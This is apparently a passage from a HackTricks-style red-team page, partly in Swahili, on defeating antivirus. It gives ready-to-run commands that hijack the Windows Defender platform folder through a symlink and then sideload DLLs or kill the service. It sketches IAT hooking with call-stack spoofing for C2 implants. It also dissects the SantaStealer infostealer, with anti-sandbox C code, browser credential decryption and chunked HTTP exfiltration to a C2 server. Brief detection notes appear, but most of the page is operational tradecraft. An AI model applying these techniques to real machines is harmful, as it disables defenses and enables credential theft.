- Uwezo wa kufanya reboot au kusababisha Defender platform re-selection (service restart wakati wa boot)
- Vifaa vilivyojengwa ndani tu vinahitajika (mklink)

Why it works
- Defender inalinda kuandika katika folda zake mwenyewe, lakini uteuzi wa platform unaegemea directory entries na huchagua toleo la juu zaidi kwa mpangilio wa leksikografu bila kuthibitisha kwamba lengo linaelekezwa kwenye path iliyolindwa/ya kuaminika.

Step-by-step (example)
1) Tayarisha nakala inayoweza kuandikwa ya folda ya platformi ya sasa, mf. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Unda symlink ya saraka ya toleo la juu ndani ya Platform inayoelekeza kwenye saraka yako:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Uteuzi wa trigger (reboot inashauriwa):
```cmd
shutdown /r /t 0
```
4) Thibitisha MsMpEng.exe (WinDefend) inaendesha kutoka kwenye njia iliyohamishwa:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Unapaswa kuona njia mpya ya mchakato chini ya `C:\TMP\AV\` na usanidi wa service/registry unaoonyesha eneo hilo.

Post-exploitation options
- DLL sideloading/code execution: Weka/ibadilishe DLLs ambazo Defender huzipakia kutoka kwenye saraka yake ya programu ili kutekeleza code katika processes za Defender. Angalia sehemu hapo juu: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Ondoa version-symlink ili wakati wa kuanza unaofuata njia iliyosanidiwa isitatambuliwe na Defender itashindwa kuanza:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Kumbuka: mbinu hii yenyewe haiwezi kutoa privilege escalation; inahitaji admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams zinaweza kuhamisha runtime evasion kutoka kwenye C2 implant hadi ndani ya module lengwa kwa ku-hook Import Address Table (IAT) yake na kupitisha APIs zilizochaguliwa kupitia attacker-controlled, position‑independent code (PIC). Hii inapanua evasion zaidi ya uso mdogo wa API ambao kits nyingi zinaonyesha (mf., CreateProcessA), na inawaletea ulinzi huo huo BOFs na post‑exploitation DLLs.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
  - Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
  - Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Apply the patch after relocations/ASLR and before first use of the import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Keep wrappers tiny and PIC-safe; resolve the true API via the original IAT value you captured before patching or via LdrGetProcedureAddress.
- Use RW → RX transitions for PIC and avoid leaving writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
- This defeats detections that expect canonical stacks from Beacon/BOFs to sensitive APIs.
- Pair with stack cutting/stack stitching techniques to land inside expected frames before the API prologue.

Operational integration
- Prepend the reflective loader to post‑ex DLLs so the PIC and hooks initialise automatically when the DLL is loaded.
- Use an Aggressor script to register target APIs so Beacon and BOFs transparently benefit from the same evasion path without code changes.

Detection/DFIR considerations
- IAT integrity: entries that resolve to non‑image (heap/anon) addresses; periodic verification of import pointers.
- Stack anomalies: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
- Image‑load evasion: if hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) illustrates how modern info-stealers blend AV bypass, anti-analysis and credential access in a single workflow.

### Keyboard layout gating & sandbox delay

- A config flag (`anti_cis`) enumerates installed keyboard layouts via `GetKeyboardLayoutList`. If a Cyrillic layout is found, the sample drops an empty `CIS` marker and terminates before running stealers, ensuring it never detonates on excluded locales while leaving a hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Mantiki ya tabaka ya `check_antivm`

- Variant A inapitia orodha ya michakato, huhash kila jina kwa custom rolling checksum, na ikalinganisha dhidi ya embedded blocklists kwa debuggers/sandboxes; inarudia checksum juu ya computer name na inakagua working directories kama `C:\analysis`.
- Variant B inakagua system properties (process-count floor, recent uptime), inaita `OpenServiceA("VBoxGuest")` kugundua VirtualBox additions, na hufanya timing checks karibu na sleeps kugundua single-stepping. Hit yoyote inasitisha kabla ya modules launch.

### Msaidizi wa fileless + double ChaCha20 reflective loading

- The primary DLL/EXE inajumuisha Chromium credential helper ambayo either dropped to disk or manually mapped in-memory; fileless mode resolves imports/relocations itself hivyo hakuna helper artifacts zinaandikwa.
- Helper huyo huhifadhi second-stage DLL iliyofichwa mara mbili kwa ChaCha20 (two 32-byte keys + 12-byte nonces). Baada ya both passes, inafanya reflective load ya blob (no `LoadLibrary`) na inaita exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` zilizotokana na [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- ChromElevator routines zinatumia direct-syscall reflective process hollowing ku-inject kwenye live Chromium browser, kurithi AppBound Encryption keys, na ku-decrypt passwords/cookies/credit cards moja kwa moja kutoka kwenye SQLite databases licha ya ABE hardening.

### Ukusanyaji modular wa in-memory & chunked HTTP exfil

- `create_memory_based_log` inapitisha global `memory_generators` function-pointer table na inazaa thread moja kwa kila enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Kila thread inaandika matokeo kwenye shared buffers na kuripoti file count baada ya takriban ~45s join window.
- Mara baada ya kukamilika, kila kitu kimezipiwa kwa statically linked `miniz` library kama `%TEMP%\\Log.zip`. `ThreadPayload1` kisha inalala 15s na ina-stream archive katika vipande vya 10 MB kupitia HTTP POST kwa `http://<C2>:6767/upload`, ikitengenezea spoof ya browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Kila chunk inaongeza `User-Agent: upload`, `auth: <build_id>`, hiari `w: <campaign_tag>`, na chunk ya mwisho inaongeza `complete: true` ili C2 ijue reassembly imekamilika.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
